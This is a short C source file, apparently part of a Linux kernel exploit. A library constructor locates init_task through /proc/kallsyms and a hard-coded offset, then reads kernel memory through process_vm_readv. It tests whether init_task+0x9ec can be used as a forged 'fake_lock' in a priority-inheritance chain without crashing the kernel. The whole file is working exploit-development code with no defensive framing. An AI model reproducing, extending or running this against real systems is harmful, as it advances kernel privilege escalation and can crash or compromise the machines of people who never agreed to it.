/*
 * Check init_task->pi_lock (wait_lock) and pi_waiters at runtime.
 * If wait_lock = 0 AND pi_waiters.rb_root = NULL → fake_lock is safe.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/uio.h>

static uint64_t read_sym(const char *nm){
    FILE *f=fopen("/proc/kallsyms","r"); if(!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while(fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if(!strcmp(s,nm)){fclose(f);return a;}
    fclose(f); return 0;
}

static ssize_t kread(uint64_t kaddr, void *buf, size_t len){
    struct iovec l={.iov_base=buf,.iov_len=len};
    struct iovec r={.iov_base=(void*)kaddr,.iov_len=len};
    return syscall(__NR_process_vm_readv, 1L, &l, 1UL, &r, 1UL, 0UL);
}

void __attribute__((constructor)) check(void){
    setvbuf(stderr,NULL,_IONBF,0);
    uint64_t stext=read_sym("_stext");
    if(!stext){fprintf(stderr,"[!] need kptr_restrict=0\n");return;}
    uint64_t init_task=stext+0x1c6d300ULL;
    fprintf(stderr,"init_task=%llx\n",(unsigned long long)init_task);

    /* Read init_task->pi_lock area (at +0x9ec, 0x20 bytes) */
    uint8_t buf[0x30]={0};
    ssize_t r=kread(init_task+0x9ec, buf, sizeof(buf));
    fprintf(stderr,"kread(init_task+0x9ec, 0x30): r=%zd\n",r);
    if(r>0){
        uint32_t wait_lock=*(uint32_t*)(buf);
        uint64_t rb_root=*(uint64_t*)(buf+8);
        uint64_t rb_leftmost=*(uint64_t*)(buf+0x10);
        uint64_t owner=*(uint64_t*)(buf+0x18);
        fprintf(stderr,"  +0x00 wait_lock   = %u (0=unlocked)\n",wait_lock);
        fprintf(stderr,"  +0x08 rb_root     = %llx (0=empty tree)\n",(unsigned long long)rb_root);
        fprintf(stderr,"  +0x10 rb_leftmost = %llx\n",(unsigned long long)rb_leftmost);
        fprintf(stderr,"  +0x18 owner       = %llx (0=NULL → chain exits!)\n",(unsigned long long)owner);
        fprintf(stderr,"\n");
        if(wait_lock==0 && owner==0)
            fprintf(stderr,"SAFE: fake_lock = init_task+0x9ec works!\n");
        else
            fprintf(stderr,"UNSAFE: owner=%llx (non-NULL → chain continues → crash risk)\n",(unsigned long long)owner);
    }
}
